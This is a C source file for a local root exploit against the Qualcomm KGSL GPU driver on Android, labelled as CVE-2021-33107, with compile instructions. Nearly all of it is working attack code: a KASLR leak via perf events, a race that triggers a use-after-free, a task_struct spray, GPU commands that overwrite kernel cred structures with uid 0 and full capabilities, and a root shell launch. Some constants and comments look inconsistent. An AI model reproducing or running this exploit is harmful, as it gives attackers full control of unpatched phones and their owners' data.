/*
 * CVE-2021-33107 (CVE-33107) kgsl UAF exploit
 * Revised for Qualcomm KGSL driver (msm-4.14)
 * Compile: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>

/* ---------- KGSL ioctl definitions ---------- */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
    unsigned int __pad;
};
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info {
    uint64_t gpuaddr;
    uint64_t flags;
    uint64_t size;
    uint64_t va_len;
    uint64_t va_addr;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import {
    uint64_t priv;
    uint64_t priv_len;
    uint64_t flags;
    unsigned int type;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr {
    uint64_t virtaddr;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid {
    unsigned int context_id;
    unsigned int type;
    unsigned int timestamp;
};
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

/* Flags */
#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT           26
#define KGSL_CACHEMODE_MASK            (0x0C000000ULL)
#define KGSL_CACHEMODE_UNCACHED        0
#define KGSL_CACHEMODE_WRITECOMBINE    1
#define KGSL_CACHEMODE_WRITETHROUGH    2
#define KGSL_CACHEMODE_WRITEBACK       3
#define KGSL_USER_MEM_TYPE_ADDR        2
#define KGSL_CONTEXT_PREAMBLE          0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC     0x00000002
#define KGSL_CMDLIST_IB                0x00000001U
#define KGSL_TIMESTAMP_RETIRED         0x00000002

/* ---------- Exploit parameters ---------- */
#define UAF_ADDR       0x7001ff000ULL
#define UAF_SIZE       0x10004000ULL          // 16MB+16KB
#define OVERLAP_ADDR   0x7001fe000ULL
#define OVERLAP_SIZE   0x7000ULL
#define BOGUS_ADDR     0x700204000ULL
#define BOGUS_SIZE     0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS     2000
#define SCAN_DWORDS    560

/* Kernel symbols (pre‑KASLR) */
#define VMLINUX_TEXT               0xffffffc010080000ULL
#define VMLINUX_INIT_CRED          0xffffffc012197d08ULL
#define VMLINUX_SELINUX_STATE      0xffffffc0123a4000ULL
#define VMLINUX_SELINUX_ENFORCING  0xffffffc01240744cULL

/* task_struct offsets (Linux 4.14) */
#define CRED_OFF        0x740
#define REAL_CRED_OFF   0x738
#define COMM_OFF        0x818

static int kgsl_fd = -1;
static volatile int race_done = 0;
static volatile int dc_civac_works = -1; /* -1=untested, 0=no, 1=yes */

/* ---------- Helper functions ---------- */
static void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

static void sigill_handler(int sig) {
    dc_civac_works = 0;
}

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

/* ---------- KASLR detection via perf_event_open ---------- */
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) {
        printf("[-] perf_event_open failed: %d\n", errno);
        return 0;
    }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) {
        close(fd);
        return 0;
    }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size);
    close(fd);

    if (n_ips == 0) {
        printf("[-] No kernel IP samples\n");
        return 0;
    }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    printf("[+] init_cred = 0x%lX (KASLR offset 0x%lX)\n",
           (unsigned long)ic_addr, (unsigned long)kaslr);
    return ic_addr;
}

/* ---------- KGSL wrappers ---------- */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = {
        .size = size,
        .flags = flags,
    };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
        die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id, void *hint) {
    void *p = mmap(hint, size, PROT_READ | PROT_WRITE,
                   MAP_SHARED | (hint ? MAP_FIXED : 0),
                   kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED)
        die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        die("gpuobj_free");
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0)
        die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {
        .context_id = ctx_id,
        .type = KGSL_TIMESTAMP_RETIRED
    };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

/* ---------- PM4 helpers (Type‑3, compatible with most Adreno) ---------- */
#define CP_NOP              0x10
#define CP_MEM_WRITE        0x3D
#define CP_MEM_TO_MEM       0x73   // Not available on A3xx, but present on A5xx+
#define CP_WAIT_MEM_WRITES  0x12
#define CP_EVENT_WRITE      0x46
#define CACHE_FLUSH_TS      0x1C

static inline uint32_t cp_type3_packet(uint32_t opcode, uint32_t count) {
    return (3 << 30) | (((count) - 1) << 16) | ((opcode & 0xFF) << 8);
}

static inline uint32_t cp_type0_packet(uint32_t regidx, uint32_t count) {
    return (0 << 30) | (((count) - 1) << 16) | (regidx & 0x7FFF);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
                     size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&cmd_obj,
        .cmdsize = sizeof(cmd_obj),
        .numcmds = 1,
        .context_id = ctx_id,
    };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ---------- Race thread ---------- */
static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done)
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

/* ---------- Main ---------- */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
        die("open /dev/kgsl-3d0");
    printf("[+] kgsl fd = %d\n", kgsl_fd);

    /* ---- Phase 0: KASLR ---- */
    printf("[*] Phase 0: KASLR detection\n");
    uint64_t init_cred_addr = detect_kaslr();

    /* ---- Phase 1: Setup rbtree (UAF + placeholder) ---- */
    printf("[*] Phase 1: Allocate UAF & placeholder\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP |
                           ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);

    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)UAF_ADDR);
    munmap(uaf_m, UAF_SIZE);

    // Placeholder to force physical page allocation pattern
    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, (void *)PLACEHOLDER_ADDR);
    // keep placeholder mapped

    // Reserve BOGUS address
    if (mmap((void *)BOGUS_ADDR, 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
        die("mmap BOGUS");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
           (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
           (unsigned long)PLACEHOLDER_ADDR);

    /* ---- Phase 2: Race ---- */
    printf("[*] Phase 2: Trigger UAF race\n");
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0)
        die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void *)OVERLAP_ADDR, OVERLAP_SIZE,
                       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                       kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) {
            hit = 1;
            break;
        }
        if (i % 500000 == 0)
            printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) {
        printf("[-] Race failed\n");
        goto cleanup;
    }
    printf("[+] Race won (errno=ENODEV)\n");

    /* ---- Phase 3: Free UAF (physical pages freed) ---- */
    printf("[*] Phase 3: Free UAF object\n");
    gpuobj_free(uaf_id);
    printf("[+] UAF freed, physical pages released\n");

    /* ---- Phase 4: Reclaim pages for task_struct spray ---- */
    printf("[*] Phase 4: Reclaim pages (compact/drop caches)\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    /* ---- Phase 5: Fork many children to spray task_structs ---- */
    printf("[*] Phase 5: Spawning %d children\n", SPRAY_PIDS);
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0)
        die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    // Root achieved – notify parent and spawn shell
                    usleep(50000);  // allow GPU writes to settle
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));

                    // Print diagnostics
                    char buf[4096];
                    int fd = open("/proc/self/status", O_RDONLY);
                    if (fd >= 0) {
                        int n = read(fd, buf, sizeof(buf)-1);
                        close(fd);
                        if (n > 0) {
                            buf[n] = 0;
                            write(1, "=== ROOT SHELL ACTIVE ===\n", 26);
                            write(1, buf, n);
                        }
                    }
                    execl("/system/bin/sh", "sh", NULL);
                    write(1, "sh exec failed\n", 15);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    /* ---- Phase 6: Create GPU context and command buffers ---- */
    printf("[*] Phase 6: Setup GPU context and buffers\n");
    unsigned int ctx_id = create_context();
    printf("  context = %u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id, NULL);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga, NULL);
    printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id, NULL);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga, NULL);
    printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);

    /* ---- Phase 7: GPU scan for task_struct ---- */
    printf("[*] Phase 7: Scanning UAF range [0x%lx - 0x%lx]\n",
           (unsigned long)(UAF_ADDR + 0x300000),
           (unsigned long)(UAF_ADDR + UAF_SIZE - 0x1000));

    uint64_t task_pages[16];
    uint32_t task_comm_offs[16];
    int n_task = 0;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;

    uint64_t scan_start = UAF_ADDR + 0x300000;
    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;

    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0)
            printf("."), fflush(stdout);

        uint32_t *cmd = (uint32_t *)ib_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x4000);
        int dw = 0;
        cmd[dw++] = cp_type3_packet(CP_NOP, 1);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type3_packet(CP_NOP, 1);
        __sync_synchronize();

        unsigned int ts;
        if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) < 0)
            break;
        if (wait_timestamp(ctx_id, ts) < 0)
            break;
        __sync_synchronize();

        // Now dst_m contains the page data
        uint32_t *data = (uint32_t *)dst_m;
        int comm_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) { // "TASK" "UAF!" reversed?
                comm_off = i * 4;
                break;
            }
        }
        if (comm_off >= 0) {
            printf("\n  [TASK_COMM] va=0x%lx comm_off=0x%x\n", (unsigned long)va, comm_off);
            task_pages[n_task] = va;
            task_comm_offs[n_task] = comm_off;
            n_task++;
        }

        int cred_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (data[i + j] == 0x000007D0) cnt++;
            if (cnt >= 4) { cred_off = i * 4; break; }
        }
        if (cred_off >= 0 && n_cred < 32) {
            printf("\n  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off;
            n_cred++;
        }
    }
    printf("\n[*] Scan complete: %d task_struct, %d cred structs\n", n_task, n_cred);

    /* ---- Phase 8: Overwrite cred ---- */
    if (n_cred > 0) {
        printf("[*] Phase 8: Overwriting %d creds with uid=0 and full caps\n", n_cred);
        for (int p = 0; p < n_cred && p < 32; p++) {
            uint64_t cbase = cred_pages[p] + cred_offs[p];
            uint32_t *cmd = (uint32_t *)ib_m;
            memset(ib_m, 0, 0x10000);
            int dw = 0;
            uint32_t addr_lo, addr_hi;
            split64(cbase + 0x04, &addr_lo, &addr_hi);
            // Write 19 dwords: uid=0, euid=0, suid=0, fsuid=0, gid=0, egid=0, sgid=0, fsgid=0,
            // securebits=4, caps full (permitted, effective, bset)
            cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 19);
            cmd[dw++] = addr_lo; cmd[dw++] = addr_hi;
            for (int i = 0; i < 8; i++) cmd[dw++] = 0; // uid/gid fields
            cmd[dw++] = 0x00000004; // securebits
            cmd[dw++] = 0; cmd[dw++] = 0; // cap_inheritable
            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_permitted (full)
            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_effective
            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_bset
            cmd[dw++] = 0; cmd[dw++] = 0; // cap_ambient
            cmd[dw++] = cp_type3_packet(CP_NOP, 1);
            __sync_synchronize();

            unsigned int ts;
            if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) == 0)
                wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            printf("  cred[%d] overwritten\n", p);
        }
    }

    /* ---- Phase 9: Wait for root shell ---- */
    printf("[*] Phase 9: Waiting for root notification\n");
    close(notify_pipe[1]);
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] Root achieved! PID = %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        waitpid(winner, NULL, 0);
    } else {
        printf("[-] No child reported root\n");
    }

cleanup:
    close(kgsl_fd);
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    return 0;
}
